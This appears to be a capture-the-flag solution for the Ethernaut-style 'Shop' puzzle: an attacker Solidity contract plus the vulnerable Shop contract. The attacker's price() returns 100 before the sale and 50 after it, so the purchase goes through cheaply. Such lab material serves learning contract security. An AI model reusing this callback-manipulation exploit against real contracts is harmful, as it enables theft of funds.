// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Buyer, Shop} from "./Shop.sol";

contract Hacker is Buyer {
    Shop private shop;

    constructor(address _shopAddress) {
        shop = Shop(_shopAddress);
    }

    function pwn() external {
        shop.buy();
    }
    
    function price() external view returns (uint) {
        return shop.isSold() ? 50 : 100;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}